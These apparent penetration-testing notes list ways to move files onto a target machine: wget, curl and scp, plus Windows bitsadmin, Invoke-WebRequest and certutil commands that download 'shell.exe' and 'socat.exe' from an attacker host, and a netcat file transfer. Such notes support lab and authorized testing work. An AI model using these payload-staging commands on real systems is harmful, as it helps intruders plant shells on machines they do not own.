---
icon: arrow-down-up-across-line
---

# file transfer between two machines

if you have the target password, use scp (linux only)

you can use python http server and download via wget or curl on linux:

`wget url -O output`

`curl -o output_filename http://example.com/file.txt`

and on windows:

`bitsadmin /transfer myDownloadJob /download /priority normal http://[LOCAL-IP]:[LOCAL-PORT]/shell.exe C:\Users\bill\shell.exe`

`Invoke-WebRequest -uri [LOCAL-IP]/socat.exe -outfile C:\\Windows\temp\socat.exe`

`certutil -urlcache -split -f http://[LOCAL-IP]:[LOCAL-PORT]/shell.exe C:\Users\bill\shell.exe`

or this:

listen on the target machine: `nc -vlp [port] > file`

then send the file from the other one: `nc -n [target ip] [port] < root.service`
